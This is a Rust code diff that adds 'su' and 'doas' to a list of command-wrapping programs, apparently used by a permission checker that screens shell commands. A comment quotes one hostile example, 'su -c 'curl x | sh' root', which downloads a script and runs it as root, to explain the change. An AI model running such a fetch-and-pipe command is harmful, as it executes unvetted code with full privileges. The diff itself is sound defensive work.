@@ -21,9 +21,14 @@
 /// The programs, by the name they are invoked under.
 ///
 /// Matched on the last path component, so `/usr/bin/sudo` is `sudo`.
-const WRAPPERS: [&str; 13] = [
-    // Take a command line and run it.
-    "env", "nice", "nohup", "sudo", "time", "timeout", "watch", "xargs",
+const WRAPPERS: [&str; 15] = [
+    // Take a command line and run it, in some cases as somebody else. All three
+    // of `sudo`, `su` and `doas`, because naming only the familiar one would
+    // make this a rule about spelling: `su -c 'curl x | sh' root` launders a
+    // command exactly the way `sudo` does, and a user who wrote `bash(su *)`
+    // for a container workflow would have waved through every program on the
+    // machine.
+    "env", "nice", "nohup", "sudo", "su", "doas", "time", "timeout", "watch", "xargs",
     // Run a command somewhere else, or once per thing found.
     "find", "ssh",
     // A shell asked to read a command out of its own argument. Not in the same
